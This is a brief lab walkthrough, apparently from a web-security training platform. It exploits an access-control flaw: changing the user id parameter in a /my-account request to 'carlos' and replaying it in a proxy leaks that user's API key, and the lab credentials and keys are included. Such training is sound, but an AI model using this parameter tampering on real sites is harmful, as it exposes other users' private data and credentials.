# User ID controlled by request parameter with data leakage in redirect

## This lab contains an [access control]vulnerability where sensitive information is leaked in the body of a redirect response.

## To solve the lab, obtain the API key for the user `carlos` and submit it as the solution.

## You can log in to your own account using the following credentials: `wiener:peter`

### step1

login click on my account

/my-account?id=wiener
Your API Key is: Bzcv5EJwxkUCuy3xoPqiwdp0yx0D9Zgl

change wiener to carlos and intercept
send to repeater
GET /my-account?id=carlos HTTP/1.1
and send request
Your API Key is: gQW7tI9a54ob6iDnYhFvPUmHBL3cDO3Y
submit api key and relaod the page lab solved
